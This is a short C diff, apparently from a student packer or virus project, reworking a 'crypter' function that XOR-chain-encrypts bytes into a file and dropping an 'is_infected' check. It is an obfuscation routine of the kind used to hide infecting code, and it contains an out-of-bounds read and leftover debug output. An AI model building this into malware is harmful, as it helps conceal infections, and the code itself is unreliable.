@@ -55,14 +55,30 @@ void crypter(char *read, size_t size, char key, int fd)
 {
 	char tab[]= {0,0};
 
-	if(size && is_infected(file->data))
+	if(size)
 	{
-		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
-		size--;
-		while (size)
+		lseek(fd, (off_t)size, SEEK_CUR);
+		// ft_putnbr(lseek(fd, (off_t)size, SEEK_CUR));
+		// ft_putstr("\n");
+		// ft_putnbr(size);
+		// ft_putstr("\n");
+		tab[(size - 1) % 2] = read[size + 1];
+		while ((int)size > 0)
 		{
-			write(fd, (tab[size % 2] = (read[offset + size] ^ tab[(size - 1) % 2])), 1);
+		// 	ft_putnbr(size);
+		// ft_putstr("\\");
+			tab[size % 2] = (read[size] ^ tab[(size - 1) % 2]);
+			write(fd, &(tab[size % 2]), 1);
+			lseek(fd, (off_t)-2, SEEK_CUR);
 			size--;
 		}
+		tab[size % 2] = (read[size] ^ key);
+		write(fd, &(tab[size % 2]), 1);
+		// ft_putstr("bite\n");
+		lseek(fd, (off_t)0, SEEK_END);
+		ft_putnbr(lseek(fd, (off_t)0, SEEK_END));
+		// ft_putstr("\n");
+		size--;
 	}
 }
+
